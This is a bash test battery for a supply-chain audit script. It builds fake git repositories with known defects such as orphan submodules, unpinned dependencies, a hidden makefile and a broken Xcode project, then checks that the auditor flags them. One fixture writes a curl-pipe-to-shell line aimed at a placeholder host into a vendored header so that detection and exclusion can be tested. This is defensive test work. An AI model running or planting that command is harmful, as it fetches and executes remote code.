#!/usr/bin/env bash
# Calibration battery for scripts/phase2-supplychain.sh.
#
# Builds throwaway git repositories containing known defects, then asserts the
# script reports exactly those. Offline, deterministic, and it never runs any
# code from the fixtures.
#
# The assertions that matter most are the ones where a BROKEN script produces
# output indistinguishable from a clean tree:
#   - an unparseable Xcode project must read as INCONCLUSIVE, never as "no
#     build steps";
#   - an exclusion list must be shown to actually exclude AND to not be hiding
#     everything;
#   - a sweep that scanned zero files must never be called clean.
set -uo pipefail
export LC_ALL=C

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
SUT="$SCRIPT_DIR/../phase2-supplychain.sh"
[[ -x "$SUT" ]] || { echo "Not executable: $SUT" >&2; exit 2; }

WORK=$(mktemp -d) || { echo "Could not create a temporary directory." >&2; exit 2; }
trap 'rm -rf "$WORK"' EXIT

PASSED=0; FAILED=0
ok()  { printf 'PASS: %s\n' "$1"; PASSED=$((PASSED+1)); }
bad() { printf 'FAIL: %s\n' "$1"; FAILED=$((FAILED+1)); }
is()  { if [[ "$2" == "$3" ]]; then ok "$1"; else bad "$1 (expected '$2', got '$3')"; fi; }
has() { if printf '%s' "$2" | grep -q -- "$3"; then ok "$1"; else bad "$1 (missing '$3')"; fi; }
hasnt(){ if printf '%s' "$2" | grep -q -- "$3"; then bad "$1 (unexpectedly found '$3')"; else ok "$1"; fi; }

gitq() { git -C "$1" -c user.email=t@example.invalid -c user.name=t "${@:2}"; }

# --- Fixture: a tree with known, countable defects -------------------------
R="$WORK/repo"
mkdir -p "$R/dependencies" "$R/vendor/boost" "$R/App.xcodeproj" "$R/src"
git init -q "$R"

cat > "$R/.gitmodules" <<'EOF'
[submodule "alpha"]
	path = deps/alpha
	url = https://example.invalid/alpha.git
[submodule "beta"]
	path = deps/beta
	url = https://example.invalid/beta.git
[submodule "ghost"]
	path = deps/ghost
	url = https://example.invalid/ghost.git
EOF

cat > "$R/Package.resolved" <<'EOF'
{"pins":[
 {"identity":"sparkle","location":"https://github.com/sparkle-project/Sparkle","state":{"revision":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","version":"2.9.1"}},
 {"identity":"yams","location":"https://github.com/jpsim/Yams","state":{"revision":"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb","version":"6.2.1"}},
 {"identity":"floaty","location":"https://example.invalid/floaty","state":{"branch":"main"}}
]}
EOF

# A legacy target naming a NON-STANDARD makefile is the whole point: a filename
# search for "Makefile" does not find "MakefilePCRE".
cat > "$R/App.xcodeproj/project.pbxproj" <<'EOF'
// !$*UTF8*$!
{
	archiveVersion = 1;
	objects = {
		AA01 /* pcre2 */ = {
			isa = PBXLegacyTarget;
			buildArgumentsString = "-f MakefilePCRE";
			buildToolPath = /usr/bin/make;
			buildWorkingDirectory = dependencies;
			name = pcre2;
		};
		AA02 /* core */ = {
			isa = PBXLegacyTarget;
			buildArgumentsString = "";
			buildToolPath = /usr/bin/make;
			buildWorkingDirectory = src;
			name = core;
		};
		AA03 /* Run Script */ = {
			isa = PBXShellScriptBuildPhase;
			shellScript = "echo building\n";
		};
	};
	rootObject = AA00;
}
EOF

printf 'all:\n\t@echo pcre\n'  > "$R/dependencies/MakefilePCRE"
printf 'all:\n\t@echo core\n' > "$R/src/Makefile"
# Red flag inside a VENDORED tree, so exclusion can be proven to work.
printf 'system("curl https://example.invalid/x | sh");\n' > "$R/vendor/boost/boost.hpp"

cat > "$R/Info.plist" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>SUFeedURL</key><string>https://example.invalid/appcast.xml</string>
  <key>SUPublicEDKey</key><string>AAAABBBBCCCC</string>
</dict></plist>
EOF

gitq "$R" add -A >/dev/null 2>&1
# Gitlinks for alpha and beta (declared), plus orphan (NOT in .gitmodules).
for entry in "deps/alpha" "deps/beta" "deps/orphan"; do
  gitq "$R" update-index --add --cacheinfo "160000,1111111111111111111111111111111111111111,$entry" >/dev/null 2>&1
done
gitq "$R" commit -qm fixture >/dev/null 2>&1
HEAD_SHA=$(git -C "$R" rev-parse HEAD)

# --- Fixture self-check: assert the input is what the tests assume ---------
is "fixture: 3 gitlinks recorded" "3" \
   "$(git -C "$R" ls-tree -r HEAD | grep -c '^160000')"
is "fixture: 3 .gitmodules path entries" "3" \
   "$(git config -f "$R/.gitmodules" --list | grep -c '\.path=')"
is "fixture: MakefilePCRE exists but plain 'Makefile' search cannot match it" "0" \
   "$(find "$R" -name 'Makefile' | grep -c 'MakefilePCRE')"

# --- Run 1: vendored tree EXCLUDED ----------------------------------------
OUT1=$("$SUT" "$R" --expect-sha "$HEAD_SHA" --exclude boost 2>&1); RC1=$?

is "run 1 exits 0 when the only red flag is excluded" "0" "$RC1"
has "revision match reported" "$OUT1" 'matches the pinned revision'
has "gitlinks counted from the tree, not submodule status" "$OUT1" 'gitlinks recorded in the tree : 3'
has "gitmodules entries counted" "$OUT1" '.gitmodules entries           : 3'
has "gitlink with no .gitmodules entry is flagged" "$OUT1" 'deps/orphan'
has "declared submodule with no gitlink is flagged" "$OUT1" "declares 'ghost'"
has "unpinned SwiftPM dependency flagged" "$OUT1" 'carry no immutable revision'
has "pinned dependency listed with its revision" "$OUT1" 'sparkle'
has "legacy targets counted" "$OUT1" 'PBXLegacyTarget entries        : 2'
has "run-script build phase counted" "$OUT1" 'PBXShellScriptBuildPhase count : 1'
has "non-standard build file recovered from the build system" "$OUT1" 'MakefilePCRE'
has "the filename-search gap is named explicitly" "$OUT1" 'filename search misses'
has "red-flag detector self-tested before reporting" "$OUT1" 'sees a known-positive line'
has "sparkle feed url surfaced" "$OUT1" 'SUFeedURL'
has "network questions declared unanswered" "$OUT1" 'RETRIEVABLE'
hasnt "excluded vendored hit is NOT reported" "$OUT1" 'boost.hpp'

# --- Run 2: same tree, nothing excluded (the positive control) -------------
# Without this, an exclusion bug that hides EVERYTHING would pass run 1.
OUT2=$("$SUT" "$R" 2>&1); RC2=$?
is "run 2 exits 1 when a red-flag pattern is in scope" "1" "$RC2"
has "the vendored hit IS found when not excluded" "$OUT2" 'boost.hpp'
has "matching lines are printed for a human to classify" "$OUT2" 'curl https://example.invalid'

# --- Run 3: wrong pinned revision -----------------------------------------
OUT3=$("$SUT" "$R" --expect-sha 0000000000000000000000000000000000000000 2>&1); RC3=$?
has "a revision mismatch is reported" "$OUT3" 'does NOT match the pinned revision'
is  "a revision mismatch is inconclusive or blocking, never 0" "yes" \
    "$([[ "$RC3" -ne 0 ]] && echo yes || echo no)"

# --- Run 4: unparseable Xcode project -------------------------------------
# The critical tripwire: a parser failure must not read as "no build steps".
B="$WORK/broken"
mkdir -p "$B/App.xcodeproj"
git init -q "$B"
printf 'this is not a plist at all {{{\n' > "$B/App.xcodeproj/project.pbxproj"
printf 'hello\n' > "$B/readme.txt"
gitq "$B" add -A >/dev/null 2>&1
gitq "$B" commit -qm broken >/dev/null 2>&1

OUT4=$("$SUT" "$B" 2>&1); RC4=$?
is "unparseable project is INCONCLUSIVE" "2" "$RC4"
has "unparseable project says so explicitly" "$OUT4" 'could not be parsed'
has "unparseable project refuses the clean reading" "$OUT4" 'NOT an absence of build steps'

# --- Run 5: a sweep that scans nothing ------------------------------------
E="$WORK/empty"
mkdir -p "$E/vendor"
git init -q "$E"
printf 'x\n' > "$E/vendor/only.txt"
gitq "$E" add -A >/dev/null 2>&1
gitq "$E" commit -qm empty >/dev/null 2>&1

OUT5=$("$SUT" "$E" --exclude vendor 2>&1); RC5=$?
is "a sweep of zero files is INCONCLUSIVE" "2" "$RC5"
has "zero files scanned is not called clean" "$OUT5" 'not a clean sweep'

# --- Argument handling -----------------------------------------------------
"$SUT" "$WORK/does-not-exist" >/dev/null 2>&1
is "a missing source tree exits 2" "2" "$?"
"$SUT" >/dev/null 2>&1
is "no arguments exits 2" "2" "$?"

echo "=================================================================="
echo "passed $PASSED   failed $FAILED"
echo "A green battery means the collector can SEE a known missing build"
echo "file, a known submodule mismatch and a known red flag. It says"
echo "nothing about whether any dependency is safe, and it asked no"
echo "network questions at all."
[[ "$FAILED" -eq 0 ]]
